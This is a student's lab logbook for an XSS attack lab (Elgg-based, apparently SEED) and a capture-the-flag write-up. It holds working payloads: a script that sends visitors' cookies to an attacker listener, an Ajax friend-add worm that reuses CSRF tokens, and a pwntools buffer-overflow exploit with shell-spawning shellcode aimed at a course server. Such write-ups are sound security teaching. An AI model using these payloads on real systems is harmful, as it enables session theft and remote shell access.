# Cross-Site Scripting (XSS) Attack Lab

## Task 1

- Logged in as Alice, since their credentials are displayed in the lab guide (username: alice, password: seedalice).
- Clicked the *Edit Profile* button and set the Brief Description with the string:
`<script>alert('hello')</script>`
- After visiting Alice's profile page, the user is surprised by a pop-up, meaning that the Javascript code was executed.

![Task 1 screenshot](images/Lab5Task1.png)

## Task 2

- The procedure is similar to the previous task, but the content of the pop-up is now replaced by the user's cookies, stored in the variable `document.cookie`

![Task 2 screenshot](images/Lab5Task2.png)

## Task 3

- Similarly to the previous tasks, edit the Brief Description of Alice's profile, but this time its content will be the string:
`<script>document.write('<img src=http://10.9.0.1:5555?c=' + escape(document.cookie) + '>');</script>`
- This way, when some user visits Alice's profile, an HTTP GET request will be sent to the attacker's machine.
- The attacker's machine must be listening on the port 5555, done by executing the following command:
`nc -lknv 5555`
- When the HTTP GET request is received, the cookies of the user that visited Alice's profile become available to the attacker.

![Task 3 screenshot](images/Lab5Task3.png)

## Task 4

- Log in as Alice and manually add Samy as a friend, by visiting his profile page and clicking on the button *Add friend*.
- Check the HTTP request of that action by using a Firefox add-on called HTTP Header Live.
- Based on the request URL, change the value of the variable `sendurl`:
`var sendurl="http://www.seed-server.com/action/friends/add?friend=59"+ts+token+ts+token`
- Log in as Samy using the given credentials (username: samy, password: seedsamy).
- Edit his profile by inserting the following script in the About Me section, using the *Text mode*, which is done by clicking on the button *Edit HTML*:

```javascript
<script type="text/javascript">
    window.onload = function () {
        var Ajax=null;
        var ts="&__elgg_ts="+elgg.security.token.__elgg_ts;
        var token="&__elgg_token="+elgg.security.token.__elgg_token;
        //Construct the HTTP request to add Samy as a friend
        var sendurl="http://www.seed-server.com/action/friends/add?friend=59"+ts+token+ts+token
        //Create and send Ajax request to add friend
        Ajax=new XMLHttpRequest();
        Ajax.open("GET", sendurl, true);
        Ajax.send();
    }
</script>
```

- Log in as Boby, using the given credentials (username: boby, password: seedboby) and visit Samy's profile. By refreshing the page, it's possible to see that Boby instantly became Samy's friend.

- Question 1 answer:
    - Lines ➀ and ➁ are stored as variables given those are dynamic security tokens unique to a user that enters Samy's profile page, which are required security parameters to add Samy as a friend.
- Question 2 answer:
    - We were unable to launch an attack in the *Editor Mode*, given that it sanitizes the input of some characters, such as "<" or ">" signs, making Javascript insertion impossible.

![Task 4 screenshot](images/Lab5Task4.png)

# Capture The Flag

## Challenge 1:

- Do a submission of an arbitrary justification and noticed that the page of the request has two buttons and one of them is called "Give the flag".
- By analyzing the HTML code of the page, we conclude that this button id is "giveflag".
- As the name says, the action of this button returns the flag of this challenge, so all we need to do is to click on it.
- This can be done by injecting Javascript code by entering the following string in the justification field:
```Javascript
<script>document.getElementById("giveflag").click()<script>
```
- Submit 1st flag ("**flag{8620558bac7f21c09ec60e0bcafc2bb1}**")

## Challenge 2:

- Downloaded the files provided for this CTF.
- Executed the `checksec program` command to analyse the program compilation protections and noticed the following characteristics:
    - No RELRO
    - No canary found
    - NX disabled
    - PIE enabled
    - No RPATH
    - No RUNPATH
- The line 12 of the code has a vulnerability, since the function *gets* keeps reading the input until it founds a newline/EOF character, independentely of the size of the variable where the program stores that input. So, by introducing an input larger than the buffer size (which in this case is 100 bytes), it continues writing past the end and into memory it doesn't own.
- We must fill the buffer with the shellcode that allows us to get access to the shell. We used the shellcode given in the Buffer Overflow Lab (LOGBOOK 5), for 32 bit system.
- We also used the Python scripts given in that lab, adjusting the values to this new problem.
- First, we tested the exploit locally, using the executable `program`.
- The buffer address is printed as soon as we run the executable, and we must get its value in runtime, since it changes everytime the program runs.
- To achieve that, we used the function recvuntil() that reads bytes from the console, to isolate the address value.
- Then, we needed to convert this value to a string, and then to heximal using the funtion int() with the second argument as 16, which is the base.
- We set the offset to 108, which is the number of positions after the buffer address where the return address is located. We found this number using gdb to dump the memory.
- Finally, using the funtion sendline(), we are able to send the buffer with the shellcode to the process.
- After success on the local experiment, we use the function remote() to connect to the server where the exploit will be applied, and we obtain the flag for this challenge.
- The final version of the Python  script used is the following:

```python
#!/usr/bin/python3

from pwn import *

DEBUG = False

if DEBUG:
    r = process('./program')
else:
    r = remote('ctf-fsi.fe.up.pt', 4001)


### Falta o encoding?
a=r.recvuntil(b" is ")
a=r.recvuntil(b".", drop=True)
a=a.decode('utf-8')
a=int(a, 16)
print(a)


shellcode= (
"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f"
"\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31"
"\xd2\x31\xc0\xb0\x0b\xcd\x80"
).encode('latin-1')

# Fill the content with NOP’s
content = bytearray(0x90 for i in range(200))
##################################################################
# Put the shellcode somewhere in the payload
start = 0 # ✩ Need to change ✩
content[start:start + len(shellcode)] = shellcode
# Decide the return address value
# and put it somewhere in the payload
ret = a # ✩ Need to change ✩


offset = 108 # ✩ Need to change ✩
L = 4 # Use 4 for 32-bit address and 8 for 64-bit address
content[offset:offset + L] = (ret).to_bytes(L,byteorder='little')

r.sendline(content)
r.interactive()
##################################################################
```
- Submit 2nd flag
